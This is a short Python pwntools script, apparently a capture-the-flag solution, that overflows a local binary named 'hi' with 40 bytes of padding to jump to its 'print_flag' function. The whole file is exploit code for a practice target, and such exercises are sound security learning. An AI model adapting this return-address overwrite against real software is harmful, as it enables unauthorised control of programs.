from pwn import*

elf=ELF('./hi')
address=p64(elf.symbols['print_flag'])
padding=b'a'*40
msg=padding+address

p=process('./hi')
p.sendline(msg)
ret=p.recvall()
print(ret)